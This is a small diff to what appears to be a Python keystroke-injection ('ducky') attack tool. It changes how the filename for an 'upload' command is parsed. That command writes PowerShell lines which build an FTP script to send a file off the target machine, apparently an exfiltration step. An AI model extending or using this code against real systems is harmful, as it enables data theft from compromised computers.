@@ -194,7 +194,7 @@ while not stop:
                 stdin = ""
         elif ducky_command[:6] == "upload":
             options = [x for x in ducky_command.split(" ")[1:] if x]
-            filename = options[0]
+            filename = ducky_command.split("\"")[1]
             commands = []
             commands.append("out-file -inputobject \"put " + filename + "\" -encoding ascii ftp.txt")
             commands.append("out-file -inputobject \"quit\" -encoding ascii -append ftp.txt")
